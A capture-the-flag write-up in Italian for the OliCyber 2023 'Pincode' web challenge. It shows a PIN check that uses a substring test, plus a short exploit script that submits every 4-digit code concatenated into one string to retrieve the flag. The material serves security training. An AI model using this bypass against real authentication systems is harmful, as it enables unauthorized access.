# OliCyber.IT 2023 - Simulazione training camp 3

## [web] Pincode (76 risoluzioni)

Siamo davanti ad un pad che ci permette di inserire il codice per entrare in una area riservata.

Fortunatamente abbiamo il codice sorgente del backend per vedere come sono generati i codici.

### Soluzione

Nonostante la generazione del codice sia randomica:

```python
def generate_code():
    return ''.join(random.choices(string.digits, k=4))
```

il controllo è eseguito tramite l'operatore `in`:

```python
    if pincode and code in pincode:
```

Possiamo quindi generare una sequenza con tutti i codici possibili e sottomettere quella.

### Exploit

```python
#!/bin/python3

import requests
import re

base_url = 'http://pincode.challs.olicyber.it'

payload = ''
for i in range(1000, 10000):
    payload += f'{i:04}'

r = requests.post(base_url, data={
    'pincode': payload
})

ans = re.findall('flag\{.*\}', r.text)

print(ans[0])
```
